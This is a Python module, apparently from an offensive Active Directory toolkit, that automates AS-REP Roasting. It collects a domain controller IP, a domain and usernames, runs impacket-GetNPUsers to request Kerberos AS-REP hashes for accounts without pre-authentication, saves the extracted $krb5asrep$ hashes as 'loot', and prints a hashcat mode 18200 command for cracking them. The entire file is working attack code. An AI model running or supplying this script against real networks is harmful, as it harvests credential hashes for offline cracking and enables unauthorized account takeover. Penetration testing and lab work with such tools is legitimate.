# modules/asrep.py

import os
from core.colors import green, red, yellow, blue
from core.helpers import run_command, save_loot, select_from_list

def attack_asrep(session=None):
    print(blue("[*] Starting AS-REP Roasting (interactive mode)..."))

    # === Use session values if provided ===
    dc_ip = session.dc_ip if session and session.dc_ip else None
    domain = session.domain if session and session.domain else None

    if not dc_ip:
        print(blue("[?] Enter Domain Controller IP:"))
        dc_ip = input("[DC IP] > ").strip()

    if not domain:
        print(blue("[?] Enter domain name (e.g., htb.local):"))
        domain = input("[Domain] > ").strip()

    usernames = []

    # === Check loot file
    loot_file = "loot/valid_users.txt"
    if os.path.exists(loot_file):
        print(yellow("[*] Found valid_users.txt. Use it? (y/n)"))
        choice = input("[y/n] > ").strip().lower()
        if choice == "y":
            with open(loot_file, "r") as f:
                usernames = [line.strip() for line in f if line.strip()]

    # === Manual fallback
    if not usernames:
        print(blue("[?] Choose input method:"))
        print("  1) Single username")
        print("  2) File with usernames")
        choice = input("[1/2] > ").strip()

        if choice == "1":
            user = input("[Username] > ").strip()
            usernames = [user]
        elif choice == "2":
            path = input("[User file path] > ").strip()
            if not os.path.exists(path):
                print(red("[-] File not found."))
                return
            with open(path, "r") as f:
                usernames = [line.strip() for line in f if line.strip()]
        else:
            print(red("[-] Invalid option."))
            return

    print(blue("[?] Save output to loot? (y/n):"))
    save = input("[y/n] > ").strip().lower() == "y"

    user_list = "users_tmp.txt"
    with open(user_list, "w") as f:
        f.writelines([u + "\n" for u in usernames])

    cmd = (
        f"impacket-GetNPUsers {domain}/ -no-pass "
        f"-usersfile {user_list} -dc-ip {dc_ip} -format hashcat"
    )

    print(blue(f"[*] Running: {cmd}"))
    out, err = run_command(cmd)
    os.remove(user_list)

    hashes = [line for line in out.splitlines() if "$krb5asrep$" in line]

    if hashes:
        print(green(f"[+] Found {len(hashes)} AS-REP roastable accounts:"))
        for h in hashes:
            print(green(h))
        if save:
            filename = f"asrep_{dc_ip}.hash"
            save_loot(filename, "\n".join(hashes))
            print(yellow(f"[+] Hashes saved to loot/{filename}"))
            print(yellow("    crack with: hashcat -m 18200 -a 0 <file> <wordlist>"))
    else:
        print(yellow("[*] No AS-REP roastable users found."))
        if err:
            print(red(err.strip()))
